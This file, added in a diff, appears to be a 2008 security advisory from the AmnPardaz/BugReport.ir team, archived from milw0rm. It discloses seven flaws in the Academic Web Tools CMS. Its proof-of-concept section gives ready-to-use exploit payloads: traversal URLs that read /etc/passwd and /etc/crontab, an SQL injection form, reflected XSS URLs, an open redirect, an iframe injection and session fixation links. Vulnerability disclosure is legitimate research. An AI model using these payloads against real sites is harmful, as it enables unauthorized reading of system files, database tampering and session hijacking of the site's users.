@@ -1,0 +1,95 @@
+########################## www.BugReport.ir #######################################
+#
+#        AmnPardaz Security Research Team
+#
+# Title: Academic Web Tools CMS Multiple Vulnerabilities
+# Vendor: www.yektaweb.com
+# Vulnerable Version: 1.4.2.8 and prior versions
+# Exploit: Available
+# Impact: Medium
+# Fix: N/A
+# Original Advisory: www.bugreport.ir/?/44
+###################################################################################
+
+####################
+1. Description:
+####################
+    ACADEMIC WEB TOOLS (AWT) yektaweb is a Persian content management system (CMS) which can manage university conferences and journals too.
+####################
+2. Vulnerabilities:
+####################
+    2.1. Directory Traversal in "/download.php" in "dfile" parameter.
+        2.1.1. Exploit:
+                        Check the exploit/POC section.
+    2.2. Injection Flaws. SQL Injection in "/rating.php" in "book_id" parameter.
+        2.2.1. Exploit:
+                        Check the exploit/POC section.
+    2.3. Cross Site Scripting (XSS). Reflected XSS attack in "/login.php" in URL parameters.
+        2.3.1. Exploit:
+                        Check the exploit/POC section.
+    2.4. Cross Site Scripting (XSS). Reflected XSS attack in "/hta/htmlarea.js.php" in "glb_sid" parameters.
+        2.3.1. Exploit:
+                        Check the exploit/POC section.
+    2.5. Cross Site Scripting (XSS). Reflected redirect XSS attack in "/rss_getfile.php" in "file" parameters.
+        2.4.1. Exploit:
+                        Check the exploit/POC section.
+    2.6. Cross Site Scripting (XSS). Stored XSS attack in "/room.php" chat service.
+        2.5.1. Exploit:
+                        Check the exploit/POC section.
+    2.7. Session Management Flaw. "/homepg/index.php" and "/homepg/login.php" are vulnerable to session fixation.
+        2.5.1. Exploit:
+                        Check the exploit/POC section.
+####################
+3. Exploits/POCs:
+####################
+    Original Exploit URL: http://bugreport.ir/index.php?/44/exploit
+    3.1. Directory Traversal in "/download.php" in "dfile" parameter.
+        -------------
+        http://[URL]/download.php?dfile=../../../../../../etc/passwd
+        http://[URL]/download.php?dfile=../../../../../../../etc/crontab
+        -------------
+    3.2. SQL Injection in "/rating.php" in "book_id" parameter.
+        -------------
+        <form action="http://[URL]/rating.php" method="post">
+        <input type=text name=book_id size=100 value="[SQL Injection]"><br>
+        <input type=hidden name=user_score size=100 value=5>
+        <input type=submit name=submit_for_rating value="Go!">
+        </form>
+        -------------
+    3.3. Reflected XSS attack in "/login.php" in URL parameters.
+        -------------
+        http://[URL]/login.php?Fake=<fake><script>alert(/sdl BugReport.IR xss/)</script>
+        -------------
+    3.4. Reflected XSS attack in "/hta/htmlarea.js.php" in "glb_sid" parameters.
+        -------------
+        http://[URL]/hta/htmlarea.js.php?glb_sid=<script>alert(/sdl BugReport.IR xss/)</script>
+        -------------
+    3.5. Reflected redirect XSS attack in "rss_getfile.php" in "file" parameters.
+        -------------
+        http://[URL]/rss_getfile.php?file=http://BugReport.ir
+        -------------
+    3.6. Reflected XSS attack in "room.php".
+        -------------
+        First of all, login into the site.
+        Now submit this : <iframe src="http://www.BugReport.ir/" width=1000 height=1000></iframe>
+        at: http://[URL]/room.php?slc_lang=fa&sid=1&user_id=1
+        -------------
+    3.7. "/homepg/index.php" and "/homepg/login.php" are vulnerable to session fixation.
+        -------------
+        First, clear the site's cookies, and then goto:
+        http://[URL]/homepg/index.php?PHPSESSID=BugReportIRSessionFixation
+        http://[URL]/homepg/login.php?PHPSESSID=BugReportIRSessionFixation
+        -------------
+####################
+4. Solution:
+####################
+    Source codes are encrypted. Wait for vendor patch.
+####################
+5. Credit:
+####################
+AmnPardaz Security Research & Penetration Testing Group
+Contact: admin[4t}bugreport{d0t]ir
+WwW.BugReport.ir
+WwW.AmnPardaz.com
+
+# milw0rm.com [2008-06-19]
